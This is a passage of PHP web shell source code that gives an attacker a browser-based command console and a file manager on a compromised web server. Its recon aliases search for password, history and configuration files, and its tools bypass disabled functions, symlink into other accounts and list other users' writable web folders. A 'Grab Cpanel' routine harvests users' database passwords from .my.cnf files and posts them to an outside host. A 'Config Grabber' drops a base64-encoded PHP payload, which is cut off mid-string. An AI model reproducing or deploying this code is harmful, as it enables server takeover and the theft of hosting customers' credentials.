                                        if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
                                        $h[1] .= '<br>';
                                        $h[2] .= "\n";
                                }
                        }
                        echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#000000><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
                        break;
                case 'rename':
                        if( !empty($_POST['p3']) ) {
                                if(!@rename($_POST['p1'], $_POST['p3']))
                                        echo 'Can\'t rename!<br>';
                                else
                                        die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
                        }
                        echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>';
                        break;
                case 'touch':
                        if( !empty($_POST['p3']) ) {
                                $time = strtotime($_POST['p3']);
                                if($time) {
                                        if(!touch($_POST['p1'],$time,$time))
                                                echo 'Fail!';
                                        else
                                                echo 'Touched!';
                                } else echo 'Bad time format!';
                        }
                        clearstatcache();
                        echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
                        break;
                /* (С) 12.2015 mitryz */
                case 'frame':
                        $frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
                        if ($frameSrc[0] != '/')
                                $frameSrc = '/' . $frameSrc;
                        if ($frameSrc[strlen($frameSrc) - 1] != '/')
                                $frameSrc = $frameSrc . '/';
                        $frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
                        echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
                        break;
        }
        echo '</div>';
        hardFooter();
}
if($os == 'win')
        $aliases = array(
                "List Directory" => "dir",
        "Find index.php in current dir" => "dir /s /w /b index.php",
        "Find *config*.php in current dir" => "dir /s /w /b *config*.php",
        "Show active connections" => "netstat -an",
        "Show running services" => "net start",
        "User accounts" => "net user",
        "Show computers" => "net view",
                "ARP Table" => "arp -a",
                "IP Configuration" => "ipconfig /all"
        );
else
        $aliases = array(
                "List dir" => "ls -lha",
                "list file attributes on a Linux second extended file system" => "lsattr -va",
                "show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
                "Find" => "",
                "find all suid files" => "find / -type f -perm -04000 -ls",
                "find suid files in current dir" => "find . -type f -perm -04000 -ls",
                "find all sgid files" => "find / -type f -perm -02000 -ls",
                "find sgid files in current dir" => "find . -type f -perm -02000 -ls",
                "find config.inc.php files" => "find / -type f -name config.inc.php",
                "find config* files" => "find / -type f -name \"config*\"",
                "find config* files in current dir" => "find . -type f -name \"config*\"",
                "find all writable folders and files" => "find / -perm -2 -ls",
                "find all writable folders and files in current dir" => "find . -perm -2 -ls",
                "find all service.pwd files" => "find / -type f -name service.pwd",
                "find service.pwd files in current dir" => "find . -type f -name service.pwd",
                "find all .htpasswd files" => "find / -type f -name .htpasswd",
                "find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
                "find all .bash_history files" => "find / -type f -name .bash_history",
                "find .bash_history files in current dir" => "find . -type f -name .bash_history",
                "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
                "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
                "Locate" => "",
                "locate httpd.conf files" => "locate httpd.conf",
                "locate vhosts.conf files" => "locate vhosts.conf",
                "locate proftpd.conf files" => "locate proftpd.conf",
                "locate psybnc.conf files" => "locate psybnc.conf",
                "locate my.conf files" => "locate my.conf",
                "locate admin.php files" =>"locate admin.php",
                "locate cfg.php files" => "locate cfg.php",
                "locate conf.php files" => "locate conf.php",
                "locate config.dat files" => "locate config.dat",
                "locate config.php files" => "locate config.php",
                "locate config.inc files" => "locate config.inc",
                "locate config.inc.php" => "locate config.inc.php",
                "locate config.default.php files" => "locate config.default.php",
                "locate config* files " => "locate config",
                "locate .conf files"=>"locate '.conf'",
                "locate .pwd files" => "locate '.pwd'",
                "locate .sql files" => "locate '.sql'",
                "locate .htpasswd files" => "locate '.htpasswd'",
                "locate .bash_history files" => "locate '.bash_history'",
                "locate .mysql_history files" => "locate '.mysql_history'",
                "locate .fetchmailrc files" => "locate '.fetchmailrc'",
                "locate backup files" => "locate backup",
                "locate dump files" => "locate dump",
                "locate priv files" => "locate priv"
        );
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
        if(isset($_POST['ajax'])) {
                prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
                ob_start();
                echo "d.cf.cmd.value='';\n";
                $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
                if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match)) {
                        if(@chdir($match[1])) {
                                $GLOBALS['cwd'] = @getcwd();
                                echo "c_='".$GLOBALS['cwd']."';";
                        }
                }
                echo "d.cf.output.value+='".$temp."';";
                echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
                $temp = ob_get_clean();
                echo strlen($temp), "\n", $temp;
                exit;
        }
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
                prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
        hardHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
        var n = (window.Event) ? e.which : e.keyCode;
        if(n == 38) {
                cur--;
                if(cur>=0)
                        document.cf.cmd.value = cmds[cur];
                else
                        cur++;
        } else if(n == 40) {
                cur++;
                if(cur < cmds.length)
                        document.cf.cmd.value = cmds[cur];
                else
                        cur--;
        }
}
function add(cmd) {
        cmds.pop();
        cmds.push(cmd);
        cmds.push('');
        cur = cmds.length-1;
}
</script>";
        echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
        foreach($GLOBALS['aliases'] as $n => $v) {
                if($v == '') {
                        echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
                        continue;
                }
                echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
        }
        echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
        if(!empty($_POST['p1'])) {
                echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
        }
        echo '</textarea><table style="border:1px solid #000000;background-color:#000000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
        echo '</form></div><script>d.cf.cmd.focus();</script>';
        hardFooter();
}
function actionbypas() {
        hardHeader();
        echo "<center><h1>Bypass Tools</h1><div class=content><br>";

        echo"<th><a href='#' onclick='g(\"passw\",null,\"s_name_".($sort[1]?0:1)."\")'> [ Bypass: /etc/passwd ] </a></th><p>";
        echo"<th><a href='#' onclick='g(\"disable\",null,\"s_name_".($sort[1]?0:1)."\")'> [ Bypass: Disbaled Functions ] </a></th>";
        echo '</div>';
        hardFooter();
}
function actionSym() {
        hardHeader();
        echo "<center><h1>Symlink</h1><div class=content><br>";

        echo "<br><center>  <iframe src='?sym' width='900' height='300'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actionpassw() {
        hardHeader();
        echo "<center><h1>Bypass: /etc/passwd</h1><div class=content><br>";

        echo "<br><center>  <iframe src='?passwd' width='900' height='400'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actiondisable() {
        hardHeader();
        echo "<center><h1>Bypass: Disabled Functions</h1><div class=content><br>";
        echo "<br><center>  <iframe src='?disabled' width='900' height='300'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actionPhp() {
        hardHeader();
        echo "<center><h1>Grab Cpanel</h1><div class=content><br>";
         @ini_set('display_errors', 0);
function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1) {
    $ar0 = explode($marqueurDebutLien, $text);
    $ar1 = explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains) {
    $domains = scandir("/var/named");
    if ($domains) {
        echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
        $count = 1;
        $dc = 0;
        $list = scandir("/var/named");
        foreach ($list as $domain) {
            if (strpos($domain, ".db")) {
                $domain = str_replace('.db', '', $domain);
                $owner = posix_getpwuid(fileowner("/etc/valiases/" . $domain));
                $dirz = '/home/' . $owner['name'] . '/.my.cnf';
                $path = getcwd();
                if (is_readable($dirz)) {
                    copy($dirz, '' . $path . '/' . $owner['name'] . '.txt');
                    $p = file_get_contents('' . $path . '/' . $owner['name'] . '.txt');
                    $password = entre2v2($p, 'password="', '"');
                    echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>" . $count++ . "</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://" . $domain . ":2082 target=_blank>" . $domain . "</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >" . $owner['name'] . "</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >" . $password . "</td><td valign=top style=border :2px solid white style=width: 139px><a href=" . $owner['name'] . ".txt target=_blank>Click Here</a></td></tr>";
                    $dc++;
                    $success3 = "http://" . $domain . "|" . $owner['name'] . "|" . $password . "
";
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "http://ww3s.ws/ok.php");
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, "result=" . base64_encode($success3));
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 1);
                    $buffer = curl_exec($ch);
                }
            }
        }
        echo '</table>';
        $total = $dc;
        echo '</center>';
    } else {
        $d0mains = @file('/etc/named.conf');
        if ($d0mains) {
            echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
            $count = 1;
            $dc = 0;
            $mck = array();
            foreach ($d0mains as $d0main) {
                if (@eregi('zone', $d0main)) {
                    preg_match_all('#zone "(.*)"#', $d0main, $domain);
                    flush();
                    if (strlen(trim($domain[1][0])) > 2) {
                        $mck[] = $domain[1][0];
                    }
                }
            }
            $mck = array_unique($mck);
            $usr = array();
            $dmn = array();
            foreach ($mck as $o) {
                $infos = @posix_getpwuid(fileowner("/etc/valiases/" . $o));
                $usr[] = $infos['name'];
                $dmn[] = $o;
            }
            array_multisort($usr, $dmn);
            $dt = file('/etc/passwd');
            $passwd = array();
            foreach ($dt as $d) {
                $r = explode(':', $d);
                if (strpos($r[5], 'home')) {
                    $passwd[$r[0]] = $r[5];
                }
            }
            $l = 0;
            $j = 1;
            foreach ($usr as $r) {
                $dirz = '/home/' . $r . '/.my.cnf';
                $path = getcwd();
                if (is_readable($dirz)) {
                    copy($dirz, '' . $path . '/' . $r . '.txt');
                    $p = file_get_contents('' . $path . '/' . $r . '.txt');
                    $password = entre2v2($p, 'password="', '"');
                    echo "<tr><td valign=top class=style2 style=width: 139px>" . $count++ . "</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://" . $dmn[$j - 1] . '/>' . $dmn[$j - 1] . ' </a></td><td valign=top class=style2 style=width: 139px>' . $r . "</td><td valign=top class=style2 style=width: 139px>" . $password . "</td><td valign=top class=style2 style=width: 139px><a href='" . $r . ".txt' target='_blank'>Click Here</a></td></tr>";
                    $dc++;
                    flush();
                    $l = $l ? 0 : 1;
                    $j++;
                }
            }
        }
        echo '</table>';
        $total = $dc;
        echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = ' . $total . '</h3><br />';
        echo '</center>';
    }
} else {
    echo "<div class=result><i><font color=#ff1111>ERROR</font><br><font color=#ff1111>/var/named</font> or <font color=#ff1111>etc/named.conf</font> Not Accessible!</i></div>";
}
        echo" </div>";
        hardFooter();
}
function actionReseller() {
        hardHeader();
        echo "<center><h1>WHM & Reseller Finder</h1><div class=content><br>";
        echo "<br><center>  <iframe src='?reseller' width='900' height='470'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
        if(!empty($_POST['p1'])) {
                switch($_POST['p1']) {
                        case 'uploadFile':
                                if ( is_array($_FILES['f']['tmp_name']) ) {
                                        foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) {
                        if(!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) {
                                echo "Can't upload file!";
                                                        }
                                                }
                                        }
                                break;
                        case 'mkdir':
                                if(!@mkdir($_POST['p2']))
                                        echo "Can't create new dir";
                                break;
                        case 'delete':
                                function deleteDir($path) {
                                        $path = (substr($path,-1)=='/') ? $path:$path.'/';
                                        $dh  = opendir($path);
                                        while ( ($▟ = readdir($dh) ) !== false) {
                                                $▟ = $path.$▟;
                                                if ( (basename($▟) == "..") || (basename($▟) == ".") )
                                                        continue;
                                                $type = filetype($▟);
                                                if ($type == "dir")
                                                        deleteDir($▟);
                                                else
                                                        @unlink($▟);
                                        }
                                        closedir($dh);
                                        @rmdir($path);
                                }
                                if(is_array(@$_POST['f']))
                                        foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
                                                $f = urldecode($f);
                                                if(is_dir($f))
                                                        deleteDir($f);
                                                else
                                                        @unlink($f);
                                        }
                                break;
                        case 'paste':
                                if($_COOKIE['act'] == 'copy') {
                                        function copy_paste($c,$s,$d){
                                                if(is_dir($c.$s)){
                                                        mkdir($d.$s);
                                                        $h = @opendir($c.$s);
                                                        while (($f = @readdir($h)) !== false)
                                                                if (($f != ".") and ($f != ".."))
                                                                       copy_paste($c.$s.'/',$f, $d.$s.'/');
                                                } elseif(is_file($c.$s))
                                                        @copy($c.$s, $d.$s);
                                        }
                                        foreach($_COOKIE['f'] as $f)
                                                copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
                                } elseif($_COOKIE['act'] == 'move') {
                                        function move_paste($c,$s,$d){
                                                if(is_dir($c.$s)){
                                                        mkdir($d.$s);
                                                        $h = @opendir($c.$s);
                                                        while (($f = @readdir($h)) !== false)
                                                                if (($f != ".") and ($f != ".."))
                                                                       copy_paste($c.$s.'/',$f, $d.$s.'/');
                                                } elseif(@is_file($c.$s))
                                                        @copy($c.$s, $d.$s);
                                        }
                                        foreach($_COOKIE['f'] as $f)
                                                @rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
                                } elseif($_COOKIE['act'] == 'zip') {
                                        if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
                                } elseif($_COOKIE['act'] == 'unzip') {
                                        if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
                                } elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
                                }
                                unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
                                break;
                        default:
                if(!empty($_POST['p1'])) {
                                        prototype('act', $_POST['p1']);
                                        prototype('f', serialize(@$_POST['f']));
                                        prototype('c', @$_POST['c']);
                                }
                                break;
                }
        }
    hardHeader();
        echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
        $dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
        if($dirContent === false) {     echo 'Can\'t open this folder!';hardFooter(); return; }
        global $sort;
        $sort = array('name', 1);
        if(!empty($_POST['p1'])) {
                if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
                        $sort = array($match[1], (int)$match[2]);
        }
echo "<script>
        function sa() {
                for(i=0;i<d.files.elements.length;i++)
                        if(d.files.elements[i].type == 'checkbox')
                                d.files.elements[i].checked = d.files.elements[0].checked;
        }
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
        $dirs = $files = array();
        $n = count($dirContent);
        for($i=0;$i<$n;$i++) {
                $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
                $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
                $tmp = array('name' => $dirContent[$i],
                                         'path' => $GLOBALS['cwd'].$dirContent[$i],
                                         'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
                                         'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
                                         'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
                                         'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
                                         'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
                                        );
                if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
                        $files[] = array_merge($tmp, array('type' => 'file'));
                elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
                        $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
                elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
                        $dirs[] = array_merge($tmp, array('type' => 'dir'));
        }
        $GLOBALS['sort'] = $sort;
        function cmp($a, $b) {
                if($GLOBALS['sort'][0] != 'size')
                        return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
                else
                        return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
        }
        usort($files, "cmp");
        usort($dirs, "cmp");
        $files = array_merge($dirs, $files);
        $l = 0;
        foreach($files as $f) {
                echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
                        .'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
                $l = $l?0:1;
        }
        echo "<tr id=fak><td colspan=7>
        <input type=hidden name=ne value=''>
        <input type=hidden name=a value='FilesMan'>
        <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
        <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
        <label><select name='p1'>";
        if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>↳ Paste</option>";
        echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
    echo "<option value='tar'>+ tar.gz</option>";
    echo "</select></label>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo "<input type='submit' value='submit'></td></tr></form></table></div>";
        hardFooter();
}
function actionStringTools() {
        hardHeader();
        echo "<center><h1>Jumping :D</h1><div class=content><br>";
        $i = 0;
@ini_set('display_errors', 0);
echo "<pre><div class='margin: 5px auto;'>";
$etc = fopen("/etc/passwd", "r") or die("<font color=white>Can't read /etc/passwd</font>");
while ($passwd = fgets($etc)) {
    if ($passwd == '' || !$etc) {
        echo "<font color=white>Can't read /etc/passwd</font>";
    } else {
        preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
        foreach ($user_jumping[1] as $user_khoer_jump) {
            $user_jumping_dir = "/home/$user_khoer_jump/public_html";
            if (is_readable($user_jumping_dir)) {
                $i++;
                $jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
                if (is_writable($user_jumping_dir)) {
                    $jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
                }
                echo $jrw;
                if (function_exists('posix_getpwuid')) {
                    $domain_jump = file_get_contents("/etc/named.conf");
                    if ($domain_jump == '') {
                        echo " => ( <font color=white>I can't take the domain name</font> )<br>";
                    } else {
                        preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                        foreach ($domains_jump[1] as $dj) {
                            $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                            $user_jumping_url = $user_jumping_url['name'];
                            if ($user_jumping_url == $user_khoer_jump) {
                                echo " => ( <u>$dj</u> )<br>";
                                break;
                            }
                        }
                    }
                } else {
                    echo "<br>";
                }
            }
        }
    }
}
if ($i == 0) {
} else {
    echo "<br>Total " . $i . " Directory " . gethostbyname($_SERVER['HTTP_HOST']) . "";
}
echo "</div></pre>";
        echo "</div>";
        hardFooter();
}

function actionSafeMode() {
        hardHeader();
        echo "<center><h1>Config Grabber</h1><div class=content><br>";
        @ini_set('display_errors', 0);
        $cgi_dir = mkdir('priv_sym', 0755);
        chdir('priv_sym');
        $file_mass = "conf.php";
        $mass_script = "PD9wSHAgJGhleCA9ICI3VnpyUnR0VkV2KzhSL0UvekxxNHNna1BrWG0yc3BVQUcrQjV2TnlkWkp5Rld3ZzVsMU9ua1RDK3NUUzJ0RlZiL08vWE15UEo4Z3VMOUh6WXF6cXFWZlNZL3ZWdytpWGg5c2ZZanZ0WmE0MXRHRE1uNGNPK1kxM3Fzdm91T2RqK3NMa1JqMWFEYks1VUV6b1FZWVA1SXpoNG5GMmQ5VUpic0hHWC9MQzlXbzZPVlhvUTI3VjY4c2ZtQm9FZkVWR1UxQTlNNE1hT2Fzd1Q0VzJOMmxKNWgyZkFDQlB1dldPSldqM0NmTWVocmlmQzJ2YWhsYTJ1Zjhnd0htOFBEcCswREZ2OXM5UFdiTUZnYmVsWVBhRDJPSjdVdjFjeDZubVkzbFNVYkt4ZXJKVS9IOVBITUdrYk5jZU43My9xRjR0M29NSzdhdSsyUDFsS2lnZlJxQ1UyMlhERUltYkxMWmRGcjBsZXZSVnNQQWdFY0FSWlkrcHJNYlVadWJaUVFHN2tNMXJBZDYxdWJSUGJqM2xtNDBic2lzQ2o3a010UStEN2taZGhZV2ZDOEh6b0NPS0pCOCtDV29oNnN1OVJEa1JxcnJnZGdnSG5ZbUZodExnWHMvR1FaK3h1clNUU3gyU2NpTDdqZTMwd2pDZDVqeTJvZXUzbmI0TUJDaFZ6OUJKZTBHbzRjSU1RTk1zdHJTL1V2NjVjS0I2Y2hJWmd3TTBOaVR5OVNzWWVSa3J3SUlJTkxORmxVN2F5cGVWOVJpd2NQZ3YrWG04djRxcTFQbXVYbEV2U2ZQbng2L3p0MzFJNm9oTE1aTVdrN3dxd2RDQWFhT3ZPdXVmdW5UVVlET0JWMmVqT3NpQUc2dkNyTU9jWlZnZEhHQ24zZ2dnUU1zdkdCY0dDSG1iZVNDUDdtYmo3cEhOU251ZUVOR0RXd05uVERxMDhZSDdqRkVTbUJKRHRYVU0zQkRFWTIvY2VjejJ6T2xUTnptcTU5TjVYWFA5V2RwcGpORmpya2RyaWtjV1ZhOTdRVkpxS01NYXdCYy96UnVzRjVvVTFsNWNJaGl6MkJMTlBNZVorNGt5UWM3M1luckJYckQrNXZzTVR2STBMcHJFZFIyOThCdTdrOFVsUkhRUm03amdXVWJlVjBBQ1VhMVdUdFhsaStRUmxGY1h3RE5QWWZzbnVuanJDN21YWHcrbVp4SUdLbk56Z0lmZjRpRE5FVm9SZWtzUXM0YU9sSWp4YVFyUERwL1hWTDRGTnM2YjJkcElsdGU5d1U5K29UR05xbnVCL3YvcHliVHhiL2RhWitPM0IyelhtaFJVdnNDMnMvdE1hYVdaUVR1WUM3R2NqN2s4K09YZWZmOTc3aWV4ODVtbWdtVStDSVR2WEV4c3FleGRjSDJIUkpCUXUreHk3ekNNN2Y3czZ2NzBoTy9MZlpqNVg0SDRMR2o5TXRwcCtBaG9WcDUrRVlRS0JIZGs1NGFtNGlGQXZPbTJWQ2FJNWtFb3lUY0JobXh0YU1XTWh4ZmJzVm5rTFpYY1hTcnJVRHNsZi9uWDIvdHJ1dGM3N242OWliU2VkMjk0VCtkZitxN0xweVplVDd0ZUNWMWRRN2lUNlNZbTQzYngrUlZoaWFadFVQeHk4MlFlU3lpNG50eGZsWWhPWGozTWRZY2JmOUUyNWRZblBlc1VzN2xSZVEvWWluaVJGMzMvNzREWGtCQXJ3eWtQYTBwUndDblpsa2QyTVNiWEJqUHVPbFRVYkVtQzNFRzlCNGExbzNlVzB1K3FEek5CdU5mWmYvYno5L3VHOTdNc3k2cXpYeXNUS09Wa2J6TkxOTDYrL3FpWkdYVVhLekJob1dPcVVMUVdadU92eUlZUjNCRDJIU0tLeDlyWE9FWFJFalJ3ZGs5ckYxZTFlNmRvdVRFL2srQ09vRW1DRU5FelMrbldjb3I5TUR6SGZ4blVBMWF1c0oxN2RrblVZM1dwSDFuQyt2ZEFnMHg1dlBkQlBxNkFoc242Z0F2MWMyZGZrYkhxdnhQKzVFcTdoOGpxOUh1NStjWUVwRWo4VWVVNm9YMU4ra2dpdzEyMFlFeGphUW93aE1TTkRUbURLUGd2a3Q4TXFBVERIM1dwWTIzekt1alJhaFJ1SUNvRUUzbm9NakM0WUZ3RVYwSVZkLzNNMHg2V2hIMnZteEFzZ0tJMkI1VjdRbnlSbkJObWpBTGsrcStBSk